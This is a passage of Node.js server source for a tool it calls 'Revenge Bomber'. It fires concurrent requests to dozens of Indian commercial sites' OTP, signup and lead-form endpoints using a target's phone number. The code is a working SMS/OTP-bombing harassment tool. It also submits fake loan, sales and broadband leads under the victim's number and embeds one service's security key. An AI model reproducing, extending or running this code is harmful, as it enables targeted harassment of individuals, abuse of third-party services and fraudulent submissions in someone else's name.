    { name: 'billtron', url: 'https://smsmediaapi.hellopatna.com/api/billtron/signup/check-mobile', method: 'POST', body: { mobile: plain10 } },
    { name: 'eurekaforbes', url: 'https://www.eurekaforbes.com/api/public/ecom/v1/otp/send', method: 'POST', body: { mobile_number: plain10 } },
    { name: 'HealthKart', url: `https://www.healthkart.com/veronica/user/validate/1/${plain10}/signup?plt=1&st=1`, method: 'GET', body: null },
    { name: 'boat', url: 'https://gkx.gokwik.co/v3/gkstrict/auth/otp/send', method: 'POST', body: { phone: plain10, country: 'IN' } },
    { name: 'licious', url: 'https://www.licious.in/api/login/signup', method: 'POST', body: { phone: plain10, captcha_token: '' } },
    { name: 'thedermaco', url: 'https://auth.thedermaco.com/v1/auth/initiate-signup', method: 'POST', body: { mobile: plain10, referralCode: '' } },
    { name: 'gonoise', url: 'https://app-eks.gonoise.com/website/v2/create/otp', method: 'POST', body: { value: plain10, type: 'phone' } },
    { name: 'freecharge', url: 'https://www.freecharge.in/api/ims/rest/otp/send/login/signup', method: 'POST', body: { mobileNumber: plain10, fcChannel: 12 } },
    { name: 'allensolly', url: 'https://www.allensolly.com/capillarylogin/validateMobileOrEMail', method: 'POST', body: { mobileoremail: plain10, name: 'markluther' } },
    { name: 'housing', url: 'https://login.housing.com/api/v2/send-otp', method: 'POST', body: { phone: plain10 } },
    { name: 'cityflo', url: 'https://cityflo.com/website-app-download-link-sms/', method: 'POST', body: { mobile_number: plain10 } },
    { name: 'unacademy', url: 'https://unacademy.com/api/v1/user/get_app_link/', method: 'POST', body: { phone: plain10 } },
    { name: 'treebo', url: 'https://www.treebo.com/api/v2/auth/login/otp/', method: 'POST', body: { phone_number: plain10 } },
    { name: 'cashify', url: `https://www.cashify.in/api/cu01/v1/app-link?mn=${plain10}`, method: 'GET', body: null },
    { name: 'muscleblaze', url: `https://www.muscleblaze.com/veronica/user/login/send/otp/9/${plain10}?trkSrc=HM-LPOPUP&forgotPassword=false&plt=1&st=9`, method: 'GET', body: null },
    { name: 'nutrabay', url: 'https://nutrabay.com/api/on-boarding/otp', method: 'POST', body: { email_or_mobile: plain10, c_code: '+91', type: 'login' } },
    { name: 'tcet_admissions', url: 'https://admissions.tcet.edu.in/web/apis/sendOtp', method: 'POST', body: { phone: plain10, requestCount: 0, sessionKey: '' } }
  ];
  jsonApis.forEach(api => { endpoints.push({ name: api.name, url: api.url, method: api.method, headers: { 'Content-Type': 'application/json' }, body: api.body }); });

  // ------------------------------------------------------------------
  // NEWER ENDPOINTS (Cleartax, Colive, Creditmantri, Deal4loans, Dealshare)
  // ------------------------------------------------------------------
  endpoints.push({ name: 'cleartax_funnel', url: 'https://cleartax.in/funnelmetrics', method: 'GET', headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': 'image/webp,image/*;q=0.8,*/*;q=0.5' }, params: { category: 'contact-sales_RAD-Company-dropdown', action: 'Click_Submit', label: 'hero_button_Send%20details', value: '{}', redirect_url: '::', name: 'user', phone_number: plain10, turnover: 'Greater than 500Cr', email: 'email@email.email', designation: 'CFO', company_name: 'TECH', product_selected: 'ClearFinance Cloud', whatsapp_consent: 'Yes', encrypted_phone_number: Buffer.from(plain10).toString('hex'), encrypted_email: Buffer.from('email@email.email').toString('hex'), utm_ref: 'lear_homepage_pages_navbar', original_referrer: '', _t: Date.now() } });
  endpoints.push({ name: 'colive_gcdbm', url: 'https://www.colive.com/api/MyAccount/GCDBM', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { Mobile: plain10, Captcha: '115b4' } });
  endpoints.push({ name: 'colive_signup', url: 'https://www.colive.com/api/MyAccount/SignupV2', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { FirstName: 'email', Mobile: plain10, Email: 'email@email.email', Captcha: '999b4', SignedUpFrom: 5 } });
  endpoints.push({ name: 'colive_otp', url: 'https://www.colive.com/api/MyAccount/GenerateOTP_v2', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { TypeId: 4, Mobile: plain10, SrcPath: '' } });
  endpoints.push({ name: 'creditmantri_otp', url: 'https://www.creditmantri.com/home/otp/', method: 'GET', params: { act: 'home_page_login', 'styled-input-tc': 'on', phone_home: plain10, referral_code: '', isGetStartedPage: 'isGetStartedPage' } });
  endpoints.push({ name: 'deal4loans_car', url: 'https://www.deal4loans.com/insert-car-loan-values.php', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, bodyForm: `PostURL=%2Fcar-loans.php&Activate=&source=CL+Main+Page&Loan_Amount=50000000&Employment_Status=0&Net_Salary=5500000&City=Bangalore&Name=email&Phone=${plain10}&Email=email%40email.email&Age=28&City_Other=&Company_Name=BMW&Car_Type=0&Car_Booked=1&cldelivery_date=&accept=on` });
  endpoints.push({ name: 'dealshare_login', url: 'https://services.dealshare.in/userservice/api/v1/user-login/send-login-code', method: 'POST', headers: { 'Content-Type': 'application/json', 'Businessmodel': 'B2C', 'Channel': 'APP', 'Appversion': '1.1.9', 'Platform': 'web', 'Devicetype': 'desktop', 'Pincode': '302006', 'Palid': '65412', 'Deviceid': '1b1a5624ec928b82' }, body: { phoneNumber: plain10, name: plain10, hashCode: '', resendOtp: 0, source: 'web', loginType: 'OTP', deviceId: '1b1a5624ec928b82' } });

  // ------------------------------------------------------------------
  // LATEST ADDITION: Excitel and YouBroadband
  // ------------------------------------------------------------------
  endpoints.push({ name: 'excitel_process_leads', url: 'https://promo.excitel.com/process-leads/index.php', method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' }, body: { name: 'PUBLIC', email: '', mobileNumber: plain10, cityName: 'Bangalore', address: 'Bangalore', zip: '', planName: 'Excitel Fiber Online MKT', source: 'www.excitel.com_Medium', utm_ad: '', utm_source: 'www.excitel.com', utm_term: '', utm_variant: '', utm_pub_id: '', utm_medium: '', utm_campaign: '', Lead_Intent_Classification: 'Medium Intent', time_on_page: '37', scroll_depth: '0', plan_clicked: '0', plan_explored: '0', cta_clicked: '0' } });
  endpoints.push({ name: 'youbroadband_otp', url: 'https://mapp.youbroadband.in/youbb/stage/execute/raw/otpGenerateAndSendOTP', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { accountNo: '410624', securityKey: 'b095f2869549ec9b7736f1d7d3242d6c', input: { city: '', pincode: '', sourceID: '204', mobile: plain10, adgroupid: '', campaignid: '', creative: '', locationid: '', device: '', keyword: '', matchtype: '', url: 'https://itapps.youbroadband.in/default/applyforconnection/applyConnectionBroadbandCampaign.jsp?soc_id=204', gclid: 'NA', source: 'customerWebReg', user_agent: 'Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0', gid: 'GA1.2.997838620.1779333118', ga: 'GA1.2.997838620.1779333118', name: 'OAUTH', bypassSource: 'No' } } });

  // ------------------------------
  // FIRE ALL REQUESTS CONCURRENTLY
  // ------------------------------
  const results = [];
  const promises = endpoints.map(async (ep) => {
    try {
      const config = { method: ep.method, url: ep.url, headers: ep.headers || { 'Content-Type': 'application/json' }, timeout: 10000 };
      if (ep.method === 'GET') config.params = ep.params || ep.body;
      else if (ep.formData) { const fd = ep.formData(plain10); config.headers = { ...config.headers, ...fd.getHeaders() }; config.data = fd; }
      else if (ep.bodyForm) { config.headers['Content-Type'] = 'application/x-www-form-urlencoded'; config.data = ep.bodyForm; }
      else { let body = ep.body; if (typeof body === 'function') body = body(plain10); config.data = body; }
      const response = await axios(config);
      return { name: ep.name, status: response.status, success: true };
    } catch (err) {
      return { name: ep.name, status: err.response?.status || 500, success: false, error: err.message };
    }
  });
  const allResults = await Promise.allSettled(promises);
  allResults.forEach(r => { if (r.status === 'fulfilled') results.push(r.value); else results.push({ name: 'unknown', success: false, error: r.reason }); });
  res.json({ total: results.length, successCount: results.filter(r => r.success).length, results });
});

// Global error handler to prevent HTML error pages
app.use((err, req, res, next) => {
  console.error('Error:', err);
  res.status(err.status || 500).json({
    error: err.message || 'Internal server error',
    status: err.status || 500
  });
});

// 404 handler
app.use((req, res) => {
  res.status(404).json({
    error: 'Not found',
    path: req.path,
    status: 404
  });
});

// Vercel serverless export
if (process.env.VERCEL) {
  module.exports = app;
} else {
  // Local development
  app.listen(PORT, () => console.log(`🔥 Revenge Bomber ready on port ${PORT}`));
}